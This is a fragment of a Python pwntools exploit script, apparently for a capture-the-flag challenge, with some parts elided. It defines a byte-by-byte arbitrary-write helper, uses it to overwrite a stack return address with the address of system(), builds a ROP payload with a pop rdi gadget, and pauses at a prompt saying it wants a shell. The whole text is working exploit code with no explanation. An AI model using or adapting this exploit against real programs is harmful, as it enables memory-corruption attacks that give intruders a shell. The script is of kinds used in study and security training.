...
#where2what
def where2what(count_byte,addr):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil("20):")
    payload = "aaaa"
...
where2what(0xce,stack_while_ret_addr)
where2what(system_addr & 0xff,stack_while_ret_addr + 0x30)
where2what((system_addr >> 8) & 0xff,stack_while_ret_addr + 0x30 + 1)
where2what((system_addr >> 16) & 0xff,stack_while_ret_addr + 0x30 + 2)
where2what((system_addr >> 24) & 0xff,stack_while_ret_addr + 0x30 + 3)
where2what((system_addr >> 32) & 0xff,stack_while_ret_addr + 0x30 + 4)
where2what((system_addr >> 40) & 0xff,stack_while_ret_addr + 0x30 + 5)
...
payload = "\x90\x90\x90\x90" + p64(pop_rdi_ret) + p64(stack_while_ret_addr + 8 + 4)
r.send(payload)

print r.recvuntil(">")
raw_input('$ I want shell here!')
r.sendline('3')
